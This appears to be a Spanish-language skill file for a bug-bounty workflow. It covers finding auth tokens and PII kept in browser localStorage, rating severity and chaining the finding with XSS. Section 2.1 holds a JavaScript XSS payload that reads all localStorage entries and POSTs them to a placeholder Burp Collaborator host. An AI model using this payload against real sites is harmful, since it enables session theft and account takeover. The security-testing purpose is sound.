---
name: web-storage
description: Detecta datos sensibles almacenados inseguramente en localStorage o
  sessionStorage — tokens de sesión, JWTs, API keys, PII. El impacto real depende
  de XSS en el mismo origen. Skill standalone con su propio evidence gate.
sources: internal (built from scratch, evidence-gate-first)
---

## Qué es esto y qué NO es

`localStorage` y `sessionStorage` son accesibles desde cualquier JS que corra en
el mismo origen — incluyendo el JS de un atacante si hay XSS. A diferencia de las
cookies con `HttpOnly`, cualquier token guardado en Web Storage es exfiltrable
directamente con `localStorage.getItem()` desde un payload de XSS.

**Lo que este skill detecta:** tokens de sesión, JWTs, API keys, o PII guardados en
`localStorage`/`sessionStorage` cuando deberían estar en cookies `HttpOnly`.

**Lo que este skill NO hace:**
- No ejecuta ningún payload activo. El impacto depende de XSS — este skill analiza
  la superficie y documenta el impacto potencial, pero la explotación real pasa por
  el skill `xss`.
- No cubre cookies — los flags de cookies (`HttpOnly`, `Secure`, `SameSite`) los
  analiza `hunt-csrf` y `cors`. Si la sesión viaja en cookie con `HttpOnly`, este
  skill no aplica.
- No cubre tokens expuestos en tráfico HTTP — eso es `exposed-secrets`.

## Señales de activación

Cargar este skill cuando aparezca cualquiera de estas señales:

- `localStorage.setItem(` o `sessionStorage.setItem(` con un nombre de key que
  sugiere auth o datos sensibles (`token`, `jwt`, `auth`, `session`, `user`,
  `apiKey`, `access_token`, `refresh_token`, `id_token`, etc.) en JS propio
  (output de `js_analyzer` o sección `## postMessage y DOM` de `recon.md`)
- Sección `## Señales observables del fingerprint` de `recon.md` con `auth_token`
  detectado en `localStorage`
- Sección `## Cookies y tokens` de `recon.md` donde el token de sesión **no** está
  en una cookie `HttpOnly` sino en un header `Authorization: Bearer` que el cliente
  construye desde JS (señal indirecta: el token debe estar guardado en algún lado
  client-side)

Input base: sección `## Cookies y tokens` de `recon.md`, sección `## Señales
observables del fingerprint`, y output de `js_analyzer` para el target.

---

## Fase 1 — Análisis de qué hay en Web Storage

### 1.1 — Inventario de keys sensibles

Por cada `localStorage.setItem(` / `sessionStorage.setItem(` detectado en JS propio,
registrar:

| Key | Storage | Tipo de dato | Sensibilidad | Fuente (archivo JS) |
|---|---|---|---|---|
| `access_token` | localStorage | JWT / Bearer token | **Crítica** — sesión completa | `bundle.js:1234` |
| `refresh_token` | localStorage | token de larga duración | **Crítica** — permite obtener nuevos access tokens | |
| `id_token` | localStorage | JWT con PII | **Alta** — email, nombre, claims del usuario | |
| `user` | localStorage | objeto JSON con PII | Alta / Media según contenido | |
| `api_key` | localStorage | API key | **Crítica** — acceso a API en nombre del usuario | |
| `cart` / `preferences` | localStorage | datos de comportamiento sin auth | Baja — no hay impacto directo | |

Clasificar cada key en:
- **Crítica** — token de sesión, refresh token, API key: exfiltración → ATO directo
- **Alta** — JWT con PII, datos de cuenta: exfiltración → information disclosure P2
- **Media** — IDs internos, flags de estado con implicancias de negocio
- **Baja** — preferencias, datos de UI, nada sensible → no es un finding

### 1.2 — Cruzar contra `## Cookies y tokens` de recon.md

Verificar si el mismo token que está en `localStorage` también viaja como cookie
`HttpOnly`. Si sí: el token en `localStorage` es redundante (posiblemente el cliente
lo usa para algo distinto al servidor), pero sigue siendo exfiltrable vía XSS.

Preguntas a responder con los datos de `recon.md`:

1. ¿La sesión se mantiene via cookie `HttpOnly` o via `Authorization: Bearer`
   construido desde JS? Si es Bearer: el token en storage es el único mecanismo
   de sesión — pérdida inmediata de cuenta si hay XSS.
2. ¿El `refresh_token` también está en `localStorage`? Si sí: la exfiltración no
   solo roba la sesión actual sino que permite renovarla indefinidamente — escalar
   impacto.
3. ¿La key está en `localStorage` (persiste entre sesiones, incluso tras cerrar el
   browser) o en `sessionStorage` (se limpia al cerrar la tab)?

### 1.3 — Token en JS bundle accesible sin auth

Revisar si algún valor sensible está **hardcodeado** en el JS bundle (no solo
escrito en runtime via `setItem`). Esto es distinto: el token estaría expuesto a
cualquier visitante sin autenticarse, no solo a quienes ya tienen sesión.

Señal: `js_analyzer` detecta un string que parece token/key dentro de un archivo
JS servido públicamente. Si se confirma → escalar a `exposed-secrets`, no a este
skill. Documentar el cruce.

### 1.4 — Clasificación del hallazgo

Con el resultado de 1.1, 1.2 y 1.3, clasificar:

- **Sin riesgo** — solo datos de baja sensibilidad en storage (preferencias, IDs
  de UI). Killer específico.
- **Superficie de ataque presente** — token de sesión o PII en `localStorage` /
  `sessionStorage`. El impacto depende de XSS — pasar a Fase 2.
- **Token hardcodeado en bundle** — cruzar a `exposed-secrets`, no es un hallazgo
  de este skill.

---

## Fase 2 — Documentación del impacto

**Este skill no genera un PoC propio.** El impacto requiere XSS en el mismo origen
— documentar el impacto potencial y el estado del XSS, y cruzar con el skill `xss`.

### 2.1 — Cadena A: exfil via XSS (impacto principal)

Si hay XSS confirmado en el mismo origen donde está el token en `localStorage`:

**El impacto es ATO directo.** Un payload de XSS puede ejecutar:

```javascript
// Exfiltrar todos los tokens de localStorage en un solo payload:
var data = {};
for (var i = 0; i < localStorage.length; i++) {
  var k = localStorage.key(i);
  data[k] = localStorage.getItem(k);
}
fetch('https://COLLABORATOR.burpcollaborator.net/exfil', {
  method: 'POST',
  body: JSON.stringify(data)
});
```

Este payload va documentado en el lead como parte del PoC de XSS — no como PoC
separado de este skill. La confirmación de ejecución la hace el operador al probar
el XSS.

**Estado de la cadena según el XSS:**

| Estado del XSS | Impacto documentado | Severidad |
|---|---|---|
| XSS confirmado (operador ejecutó PoC) en mismo origen | ATO directo — token exfiltrable | **P1/P2** |
| XSS como candidato activo (pendiente de ejecución) | ATO potencial — pendiente de confirmación de XSS | **Candidato — no reportar todavía** |
| Sin XSS detectado en el mismo origen | Superficie de ataque presente, sin vector actual | **P4** — documentar, monitorear si aparece XSS |
| XSS en subdominio distinto | No alcanza localStorage del origen principal (same-origin policy) | **No aplica** — each origin tiene su propio storage |

### 2.2 — Cadena B: persistencia post-logout

Si la app no limpia `localStorage` al hacer logout, el token sigue accesible en
el browser hasta que expire o se limpie manualmente.

**Cómo verificarlo (sin ejecución activa — el operador lo hace):**

1. Loguearse con la cuenta de test y verificar que el token está en `localStorage`
   (DevTools → Application → Local Storage).
2. Ejecutar el logout desde la app.
3. Volver a DevTools y verificar si el token sigue en `localStorage`.
4. Intentar usar el token directamente en una request a la API del target (con
   `Authorization: Bearer [token_copiado]`) — si el server lo acepta, el token
   sigue válido server-side aunque el usuario haya hecho logout client-side.

**Impacto si se confirma:** en una PC compartida o si hay acceso físico al browser
post-logout, el token sigue siendo usable. P3 standalone si el token es de sesión
válido; sube si se puede combinar con otro vector (XSS almacenado que persiste en
la página, acceso físico al equipo).

**Killer si no aplica:** "la app llama `localStorage.clear()` o `localStorage.removeItem([key])`
en el flujo de logout — verificado en el JS del evento de logout".

### 2.3 — Cadena C: token en JS bundle accesible sin auth

Si el `js_analyzer` detectó un token o API key hardcodeado en el bundle (no escrito
en runtime):

→ Cruzar a `exposed-secrets` — este caso no es "web storage inseguro", es un
secreto embebido en código estático. El impacto no depende de XSS.

Documentar en `leads.md` el cruce con el killer: `"token hardcodeado en [archivo.js]
— lead transferido a exposed-secrets, fuera de scope de este skill"`.

---

## Gate de evidencia — techo de severidad

| Evidencia | Techo |
|---|---|
| `localStorage.setItem('token', ...)` detectado en JS estático via `js_analyzer` | **P4** — superficie de ataque, sin vector de explotación activo |
| Token confirmado en storage en runtime (operador lo verificó en DevTools) | **P4** — misma situación, pero confirmado en vivo |
| Token persiste en storage post-logout (operador lo verificó) | **P3** — misconfiguration standalone |
| Token en storage + XSS candidato activo (pendiente de PoC) | **Candidato — no reportar todavía** |
| XSS confirmado en mismo origen + token en storage | **P2/P1** — ATO directo, escalar según alcance del XSS |

**Nunca reportar por encima de P4 solo por la presencia del token en `localStorage`
detectada en JS estático.** Sin XSS confirmado, la superficie de ataque existe pero
no hay vector que el atacante pueda aprovechar remotamente.

---

## Qué mata el lead

- **La sesión se mantiene via cookie `HttpOnly`** y el token en `localStorage` es
  solo para uso client-side (por ejemplo, para decodificar claims del JWT y mostrar
  el nombre del usuario en la UI, sin enviarlo al server). Killer: `"token en
  localStorage es cosmético — la auth real va en cookie HttpOnly; exfiltrar el JWT
  no da sesión server-side"`.
- **`sessionStorage` + tab cerrada** — el token desaparece cuando la tab se cierra.
  Reduce la ventana de ataque pero no mata el vector XSS — documentar la reducción
  de impacto, no cerrar el lead.
- **Sin XSS detectado ni candidato en el mismo origen** — el lead queda en P4.
  No cerrarlo si el target sigue sin análisis de XSS completo — marcar como
  BLOQUEADO pendiente de `xss` skill en el mismo origen.
- **CSP que bloquea exfiltración** — si el target tiene una CSP estricta con
  `connect-src` sin wildcards, el `fetch` del payload de exfil puede ser bloqueado.
  Verificar si la CSP bloquea `fetch` a orígenes arbitrarios — una CSP que bloquea
  exfiltración pero permite XSS sigue siendo un problema (el JS puede leer el token
  aunque no pueda mandarlo — puede mostrarlo en el DOM o usarlo en requests al
  mismo origen). No matar el lead por CSP sin verificar qué exactamente bloquea.

Documentar el killer con exactitud — no "no hay XSS" genérico. Documentar qué
análisis de XSS se hizo y por qué se descartó ese origen.

---

## Encadenamiento

- **XSS en mismo origen** → exfil inmediata de todo el storage. La combinación
  es la cadena principal de este skill — cruzar con `xss` y escalar a P1/P2 si
  el XSS está confirmado.
- **Persistencia post-logout + acceso físico / PC compartida** → el token sigue
  en storage aunque el usuario haya cerrado sesión. P3 standalone, sube si hay
  otro vector que lo aproveche.
- **refresh_token en localStorage** → la exfil no solo roba la sesión activa sino
  que permite renovarla indefinidamente hasta que el refresh token expire o sea
  revocado. Escalar impacto si el refresh token tiene vida larga.
- **JWT con PII en localStorage** → aunque no se use para auth, los claims del JWT
  son legibles por cualquier JS del mismo origen y exfiltrarlos expone datos del
  usuario. Cruzar con `idor-bola` si los claims incluyen IDs de recursos.

Al documentar cualquier hallazgo de este skill, correr `chain_analysis.md`
Parte 2 para ese tipo de hallazgo antes de cerrar el lead.

---

## Related Skills & Chains

- **`xss`** — el vector de explotación de este skill. Sin XSS confirmado en el
  mismo origen, el impacto queda en P4. Priorizar análisis de XSS en el mismo
  origen antes de escalar severidad.
- **`hunt-csrf`** — si la sesión viaja en cookie, los flags de esa cookie
  determinan la superficie de CSRF. Complementario a este skill, no superpuesto.
- **`cors`** — si el endpoint de API acepta Bearer desde `localStorage` y tiene
  CORS misconfiguration, un atacante cross-origin puede leer responses autenticadas
  sin necesitar XSS. Cruzar si hay ambas señales en `recon.md`.
- **`exposed-secrets`** — si el token está hardcodeado en el JS bundle (no escrito
  en runtime via `setItem`), el lead pertenece a `exposed-secrets`, no a este skill.
